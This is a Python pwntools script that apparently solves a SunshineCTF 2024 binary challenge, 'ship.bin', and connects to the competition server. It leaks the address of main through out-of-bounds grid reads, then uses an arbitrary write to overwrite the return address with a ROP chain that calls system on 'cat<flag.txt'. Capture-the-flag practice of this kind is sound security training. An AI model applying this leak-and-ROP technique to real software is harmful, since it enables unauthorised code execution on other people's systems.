from pwn import *

#so things look neat just do python sol.py | grep sun 
e = ELF("ship.bin")
context.terminal = ['tmux', 'splitw', '-h']

#get the symbols and offsets i need
system_off = e.symbols['main']  - e.plt['system']
flag_off = e.symbols['main'] - next(e.search(b"cat<flag.txt\0"))
pop_rdi_off = -797

#just to leak main 
def leak_main(io):
    
    main_base = 728
    addr = 0

    for i in range(8):
        io.sendlineafter(b'row', b'0')
        io.sendlineafter(b'column', str(728 + i).encode())
        io.sendlineafter(b'type', b'T')
        io.recvuntil(b'from')
        
        hex1 = io.recvline()
        hex1 = int(hex1.split()[0],16)
        addr += hex1 << i * 8 
    
    return addr

#will write a value to an arbitrary address 
def arb_write(io, offset, val):
    
    addr = list(p64(val))
    
    for i in range(8):
        io.sendlineafter(b'row', b'0')
        io.sendlineafter(b'column', str(offset + i).encode())
        io.sendlineafter(b'type', b'C')
        io.sendline(p8(addr[i])) 
        
#io = process("./ship.bin")
#io = gdb.debug("./ship.bin", '''c
#''')

io = remote( "2024.sunshinectf.games", 24003 )
main =  leak_main(io)

#calculate address of system and cat flag 
system = main - system_off
flag = main - flag_off
pop_rdi = main - pop_rdi_off

ret_addr = 536

#write to the return address 
arb_write(io, ret_addr , pop_rdi)
arb_write(io, ret_addr + 8, flag)
arb_write(io, ret_addr + 16, pop_rdi + 1)
arb_write(io, ret_addr + 24, system)

try:
    for i in range(16):
        for j in range(16):
            print(io.sendlineafter(b'row', hex(i).encode()))
            print(io.sendlineafter(b'column', hex(j).encode()))
            print(io.sendlineafter(b'type', b'T'))
except:
    pass

io.interactive()

